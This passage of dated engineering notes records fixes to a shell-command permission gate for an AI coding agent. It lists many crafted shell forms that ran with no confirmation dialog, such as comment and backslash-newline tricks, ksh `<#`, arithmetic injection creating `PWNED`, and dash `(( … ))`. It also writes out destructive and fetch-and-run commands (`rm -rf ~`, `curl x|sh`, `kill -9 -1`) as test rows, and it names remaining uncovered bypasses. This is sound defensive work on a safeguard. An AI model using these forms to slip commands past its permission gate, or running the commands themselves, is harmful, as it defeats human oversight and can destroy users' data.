    `[ #ab]` in all nine. Comments the shells start stay ALLOW
    (`echo hi # $(: > MARK)`, `echo \\ #…`, `echo \⏎#…`, `(echo)#…` and
    `echo;#…` ran nothing in the nine shells).
  - *A command tree-sitter rejects is read joined too* when it holds `\⏎`,
    and the verdict is the higher of ASK and that reading:
    `rm -rf / 2>\⏎&1` and `cat <\⏎(curl x|sh)` were ASK and are DENY, as
    are all 170 inserted-continuation variants of the round-2 verify's
    property test that it flagged.
  - *The `.sh` pattern decides verdicts* (a correction to the round-1
    comment): `[[ -t .sh.match ]]`, `[ -t .sh.match ]` and
    `[[ -t 0+.sh.match ]]` were ALLOW on `71f837eb`, ask now, and are ALLOW
    again with the pattern taken out of a copy; no shell ran a `-t` form,
    so there it only asks more.
  - *Only raises.* Against `71f837eb` and `eb98b93b`, with and without
    `classify`'s catch: the #710 sweep (26,718 argv strings, 2,012,340
    forms) has none below either and no exception; its 276 changes from
    `eb98b93b` (207 ALLOW to ASK, 51 ALLOW to DENY, 18 ASK to DENY) are all
    this round's `\ #…` test rows with a redirect inserted. The 7,560-,
    936- and 704-form grids and the 1,531 attack forms keep every verdict.
    Of the 108,960 here-documents, 279 go from ASK to DENY, each one
    tree-sitter rejects whose joined reading reaches `find victim -delete`,
    for 38 of the 206 below through that reading's prefix fallback
    (`_reread_lines`) and not the joined reading itself: there the `\⏎`
    comes after that line, and the same text without it (such as
    `cat <<A''⏎x⏎A''⏎find victim -delete⏎A`) is DENY on `71f837eb` too
    (the round-3 verify, `.omc/probes/762/verify-r3/out/hd-after-payload.txt`);
    with `: > MARK` in its place, 73 of them ran that line in at least one
    of the nine shells (45 in all nine) and 206 in none, so there a DENY
    replaces an ASK the shells did not need. The round-2 verify's property
    test (30,023 strings, 536,689 variants with `\⏎` inserted where the
    shells remove it) has no variant below its unsplit string, below
    `71f837eb` or below `eb98b93b`, and no exception; its only change from
    `eb98b93b` is those 170 ASK to DENY.
  - *Cost.* Over 31,822 corpus, test, realistic and continued strings,
    40 of them commented commands written for this round
    (`.omc/probes/762/fix-r2/corpus/`), no verdict changed from `eb98b93b`
    under UNKNOWN or POSIX. 581 of those strings hold a comment node; 12
    hold one the rule reads as starting mid-word (`trusted#release`,
    `a#b`), and all 12 asked on `71f837eb`, `eb98b93b` and now; of the
    other 569, 41 are ALLOW and 528 ASK on all three.
  - *Live* (pty TUI under `auto`, scripted model, scratch HOME, agent dir
    and cwd, `.omc/probes/762/fix-r2/live/`):
    `cat <<E⏎${x:-'$\⏎(: > MARK)'}⏎E` and `echo \ #$(: > MARK)`, with
    `SHELL=/bin/bash` and `/bin/zsh`, ran with no dialog and created `MARK`
    on `71f837eb` and on `eb98b93b`, and open "Run shell command?" now with
    nothing created after Esc; `echo hi # $(: > MARK)` runs with no dialog
    and creates nothing on all three.
- **#762 finish** (2026-11-12, the round-3 verify's findings after the two
  fix rounds; shell rows in `.omc/probes/762/finish/`, run as above in the
  nine shells, with executables named `#x` and `x` that create `MARK` first
  on `PATH`).
  - *A `#` right after `<` or `>`.* ksh93 reads `<#` and `>#` as operators
    (a seek), so `_WORD_BREAKS` no longer holds `<` and `>`, and a comment
    tree-sitter starts right after one asks and is re-read in its word.
    `cat <#$(: > MARK)⏎/dev/null`, `wc -l <#…`, `cat 0<#…` and
    `grep x <#…⏎files/r` created `MARK` in macOS ksh93u+ and Linux ksh
    93u+m and in none of the other seven shells; they were ALLOW on
    `71f837eb` and on the round-2 fold `b0039212`, and ask now.
    `cat <#$(rm -rf ~)⏎/dev/null` (ALLOW there) and
    `echo hi >#$(rm -rf ~)⏎out.txt` (ASK there; its `: > MARK` twin ran in
    both ksh93 builds) are DENY now (classified only). With a blank after
    `<`, `cat < #$(: > MARK)⏎/dev/null` ran nothing and stays ALLOW, as do
    `echo hi >/dev/null # note` and `ls -la  # list files`; after `;`, `&`,
    `&&`, `||`, `|`, `(`, `$(` and `)` no shell ran `#$(: > MARK)` or `#x`.
    Only raises, with and without `classify`'s catch, against `71f837eb`
    and `b0039212`: the #710 sweep (26,724 argv strings, 2,012,640 forms),
    the 108,960 here-documents, the 7,560-, 936- and 704-form grids, the
    1,531 attack forms and the round-3 verify's property test (30,082
    strings, 537,085 variants) have none below either, no exception and no
    change from `b0039212`; of the 30,097 corpus, test and realistic strings
    harvested with this round's rows, the only changes from `b0039212` are
    those rows' `<#` forms, and of the 31,822 cost strings none changed.
    Live (pty TUI under `auto`, scripted model, scratch HOME, agent dir and
    cwd, `SHELL=/bin/ksh`, `.omc/probes/762/finish/live/`):
    `cat <#$(: > MARK)⏎/dev/null` ran with no dialog and created `MARK` on
    `b0039212`, as the round-3 verify saw on `71f837eb`, and opens "Run
    shell command?" now with nothing created after Esc;
    `cat < #$(: > MARK)⏎/dev/null` runs with no dialog and creates nothing
    on both.
  - *Kept where the shells remove it.* The round-3 verify's printf probes
    (`.omc/probes/762/verify-r3/out/kept-cmp.txt` and `kcom-table.txt`):
    inside backticks all nine shells remove a `\⏎` from a `'…'` or `$'…'`
    and from the end of a comment; inside `$(…)` in a here-document body
    seven of the nine do (dash keeps it); inside `"$(…)"` macOS bash 3.2
    does at the end of a comment and in a `$'…'` in a `${…}` operand. This
    reading keeps it in all of these. That hides no code from the
    classifier: a quote that still quotes keeps its content literal, and a
    comment the shells continue only hides the next line from them, which
    the classifier still reads. It can change a quoted argument's text,
    though: ``printf '[%s]\n' `printf %s '-de\⏎lete'` `` printed
    `[-delete]` in all nine shells, and ``echo `find . '-de\⏎lete'` `` is
    ALLOW on `71f837eb`, `b0039212` and now (classified only). That and the
    shells' other unescaping inside backticks (`\\`, `\$`, `` \` ``) are
    left to a follow-up issue (*Not covered* below).
    *Dated note 2026-11-12 (#768):* inside backticks and inside a `$(…)` in
    an expanded here-document body these are now also read joined, beside
    this reading, and the higher verdict holds; inside `"$(…)"` they stay
    kept (all nine shells kept a `\⏎` in a `'…'` there). Backtick text is
    also re-read as the shells unescape it. ``echo `find . '-de\⏎lete'` ``
    is DENY now. ADR-0158's #768 note (under #742) has the shells, the cost
    and the sweeps.
- **Every other entry point was checked** (the before and after verdicts are
  rows of `tests/builtin/test_bash_arith_names_762.py`). These asked on
  `71f837eb` and still do: `$((…))` in a here-document body (tree-sitter
  reads `$((` there as `$(` and a subshell), a `${…}` operand holding `$((`
  (#742's re-read), `for ((…))`, `case`, `select`, `let`, `declare -i`, an
  operand of a `[`/`[[`/`test` arithmetic operator (#743), `read`, `getopts`,
  `mapfile` and `alias`, and `printf '%d'` (macOS ksh93u+ evaluates its
  argument as arithmetic). These were ALLOW and ask now: `$((…))` in a
  string, a here-string, a brace range, a command or backtick substitution,
  and `[[ -n … ]]` or `[ -n … ]`. A positional or special parameter reaches
  arithmetic only as an expansion: `$1`, `$@`, `$-` and `$_` asked already,
  and `$#`, `$?`, `$$` and `$!` are numbers and stay ALLOW.
- **Cost.** Of the 31,348 corpus, test and realistic strings, and 185 more of
  the #742/#743 round-3 verify's 199 lines, none changed under UNKNOWN or
  POSIX. Of 141 arithmetic lines written for this note
  (`.omc/probes/762/impl/`), these went from ALLOW to ASK:
  `[[ $v =~ … ]] && echo "$(( BASH_REMATCH[1] + 1 ))"`, `echo $((REPLY))`,
  `echo "${a[_]}"`, `echo $(( COMP_LINE ))`, `echo $(( "1" + 2 ))`,
  `echo $(( '1' + 2 ))` and two `$((…))` continued over a backslash-newline;
  `echo $(( ${#BASH_REMATCH[@]} ))` asked on `7cbc282d` and is ALLOW again
  after fix round 1 (`.omc/probes/762/fix-r1/corpus/own-arith-fr1.txt`).
  `echo $((i+1))`,
  `echo ${a[i]}`, `echo $((x*2))`, `echo $((RANDOM % 6))`,
  `(( BASH_VERSINFO[0] >= 4 ))` and `echo "${BASH_REMATCH[1]}"` stay ALLOW;
  `(( n++ ))` asked already on `71f837eb` (an assignment operator) and still
  does.
- **Only raises.** Against `71f837eb`, the #710 sweep (26,620 argv strings,
  2,007,660 forms, UNKNOWN), the 108,960 here-documents, the 7,560-form
  `[`/`[[`/`test` grid, the 936-form substitution set, the 704-form `${…}`
  grid and the round-3 verify's 1,531 attack forms (UNKNOWN and POSIX) have
  none below it and no exception with or without `classify`'s catch. The
  grids keep every verdict; the sweep's 1,313 changes are ALLOW to ASK, each
  a form holding one of these names or a quote in arithmetic. Re-run after
  fix round 1 (`.omc/probes/762/fix-r1/sweep/`), with this round's test
  strings in the sweep's harvest (26,674 argv strings, 2,010,240 forms):
  none below
  `71f837eb`, 1,389 ALLOW to ASK and no exception; against `7cbc282d` its
  only changes are 355 ASK to ALLOW, every one a form holding a length or a
  base-N literal, and the here-documents, the three grids and the 1,531
  attack forms keep every verdict.
- **Live.** In a pty TUI under `auto`, with a scripted model and a scratch
  cwd holding `files/z[$(touch PWNED)]`, `ls files/* >/dev/null; echo $((_))`,
  `[[ 'a[$(touch PWNED)]' =~ .* ]] && echo $((BASH_REMATCH))` and
  `ls files/* >/dev/null; echo ${PATH:_}` with `SHELL=/bin/bash`, and
  `echo $(( '$(touch PWNED)' ))` with `/bin/zsh`, ran with no dialog and
  created `PWNED` on `71f837eb`; each opens "Run shell command?" now, and
  nothing is created after Esc. `echo $((1+2)) ${PATH:0:4}` runs with no
  dialog on both. A real model (OpenRouter `openai/gpt-4.1-mini`) asked to
  run `ls files/* >/dev/null; echo $((_))` under `--permission-mode auto -p`
  ran it and created `PWNED` on both trees, because `-p` runs an ASK
  (ADR-0120, #740); with `AELIX_SUBAGENT_DEPTH=1`, the headless block gate, it
  ran on `71f837eb` and is refused now. Fix round 1, the same pty TUI with
  `files/z[$(: > MARK)]` (`.omc/probes/762/fix-r1/live/`):
  `ls files/* >/dev/null; echo $(\⏎(echo -_))` with `SHELL=/bin/bash` and
  `echo $(\⏎(echo '$(: > MARK)'))` with `/bin/zsh` ran with no dialog and
  created `MARK` on `71f837eb` and on `7cbc282d`, and open "Run shell
  command?" now, with
  nothing created after Esc; `ls files/* >/dev/null; echo $(( ${#_} + 1 ))`
  opened the dialog on `7cbc282d` only, and `ls -la \⏎ files/` ran with no
  dialog on all three. `openai/gpt-4.1-mini` asked to run the first under
  `auto -p` with `AELIX_SUBAGENT_DEPTH=1` ran it and created `MARK` on
  `71f837eb`, and is refused now; plain `-p` still runs it, as every ASK.
- **Not covered:** any name the environment sets (`FOO` above), as before;
  the shells' unescaping inside backticks, which `_backtick_text_verdict`
  re-reads only for `` \` `` or a quoted backtick: they undo `\\`, `\$` and
  `` \` `` and remove `\⏎` there first, so
  ``echo `echo "${x:-'\$(: > MARK)'}"` `` (all nine shells, the round-3
  verify's `out/bt2-table.txt`) and ``echo `find . '-de\⏎lete'` `` (above)
  are ALLOW, as on `71f837eb` (a follow-up issue); *#768 (2026-11-12) covers both*:
  the first asks and its `rm -rf ~` twin is DENY, and the second is DENY
  (ADR-0158's #768 note);
  Windows Git Bash and the shells' interactive modes were not measured. The
  round-1 verify ran the issue's eight forms in Linux bash 5.3.20 (docker
  `bash:5.3`): all eight created the marker there, and `7cbc282d` asks on
  all eight (`.omc/probes/762/verify-r1/shells/bash53.jsonl`).

### Dated note 2026-11-12 (#788): `$[…]` and `(( … ))` in the shells that lack them

The #762 note reads `$[…]` and `(( … ))` as arithmetic, as bash and zsh do.
dash, ksh93 and mksh have no `$[…]`, and dash has no `(( … ))`: dash reads
`((` as two subshells around a command list. Measured with `<shell> -c` in a
fresh scratch directory (`.omc/probes/784-788/impl/shells/`):
`echo $[2>MARK]` created `MARK]` in macOS dash and ksh93u+ and Linux dash,
ksh 93u+m and mksh; `(( 1>MARK ))` created `MARK`, `(( x >= MARK ))` a file
`=` and `(( n > 0 ))` a file `0` in macOS and Linux dash; bash and zsh
created none. dash also runs any other command there (the round-1
cross-review, `.omc/probes/784-788/cross-r1/neighbours-1.txt`):
`(( echo == hi ))`, `(( a || echo == hi ))` and `(( 1 & echo == hi ))`
printed `== hi` in both dash builds, and `echo $[1|echo == hi ]` printed
`== hi ]` in dash, both ksh93 and mksh. All were ALLOW on `52bc607a`.

- **The decision.** The owner decided on 2026-11-12, "보호 경로만 거부,
  나머진 유지 (권장)": refuse protected targets, keep `(( n > 0 ))` allowed,
  document dash's relative writes and `(( ls | sh ))`. The lead read it,
  after the cross-review showed dash runs any `(( … ))` as commands, as:
  under the POSIX dialect, which the gate gives every classifiable shell,
  those shells' reading of `(( … ))` and `$[ … ]` counts only when it is
  DENY; otherwise the bash reading's verdict stands (ADR-0158's
  #784–#789 note, `_dash_verdict`). `(( rm -rf /home ))`,
  `ls && (( rm -rf /home ))`, `(( ls | sh ))`, `echo $[1|rm -rf /home ]`,
  `(( 1>'/etc/x' ))`, `(( 1>~/.bashrc ))` and `echo $[2>~/.bashrc]` are
  refused under POSIX (classified only; the first four ALLOW and the last
  three ASK on `52bc607a`); `echo $((a > b))` stays ALLOW, as `$((…))` is
  arithmetic in every shell measured.
- **Cost.** Nothing measured changed for bash users. The round-1 verify's
  extraction of 102 standalone `(( … ))` commands holding `<` or `>` from
  998 real system scripts (350 macOS, 648 Debian trixie,
  `.omc/probes/784-788/verify-r1/cost/extracted.txt`) reads as on
  `52bc607a` under both dialects, 50 ALLOW and 52 ASK under POSIX
  (`a9f39aa2` asked about all 102 there), and so do the other 200 lines of
  that file and the 1,434 lines of its `all-lines.txt`.
  `(( a > b )) && echo yes` and `(( BASH_VERSINFO[0] >= 4 )) && echo new`,
  ALLOW in #762's tests, stay ALLOW under both dialects. The 31,958 and
  16,649 strings and the 14,428 real script lines of ADR-0158's notes read
  as on `52bc607a` (`.omc/probes/784-788/fix-r1/cost/`), and all of these
  still do on fix round 2's tree (`.omc/probes/784-788/fix-r2/sweep/corpus.txt`,
  `linescost.txt`).
- **What the decision keeps** (*Not covered*): for a dash user, a write to a
  relative name (`(( 1>MARK ))`, `echo $[2>MARK]` and `(( n > 0 ))` run
  with no dialog and leave `MARK`, `MARK]` and `0`; the audit re-run's 45
  #788 hits are all such writes), and a command the classifier does not
  refuse on its own (`(( echo == hi ))`, `echo $[1|echo == hi ]`).
- **Past the quoted decision** (fix round 2, the round-2 verify's F6). The
  lead's DENY-only reading goes further than the decision's "보호 경로만
  거부" (refuse protected paths only): it leaves every ASK-level command
  dash runs there with no dialog, the destructive ones included.
  `(( crontab -r ))`, `(( kill -9 -1 ))`, `(( reboot ))`, `(( poweroff ))`
  and `(( halt ))` are ALLOW under both dialects, as on `52bc607a`, while `crontab -r`, `kill -9 -1`, `reboot`,
  `poweroff` and `halt` alone ask (classified only, never run). dash runs
  them as commands: `(( echo -r ))`, `(( echo -9 -1 ))` and
  `(( echo crontab -r ))` printed `-r`, `-9 -1` and `crontab -r` in macOS
  and Linux dash, where bash printed nothing
  (`.omc/probes/784-788/fix-r2/ev/f6-dash.txt`). These ASK-level commands
  are left to the per-shell-dialect follow-up: a gate that tells dash from
  bash would read them, and the relative writes above, in full for dash
  (drafted, not posted:
  `.omc/probes/784-788/finish/issue-draft-shell-dialect.md`).
- **Under UNKNOWN** the bash reading stands, as ADR-0158 keeps it for
  `[[ a > MARK ]]`: the gate gives UNKNOWN only to a shell it cannot
  classify, whose ALLOW it does not honour.
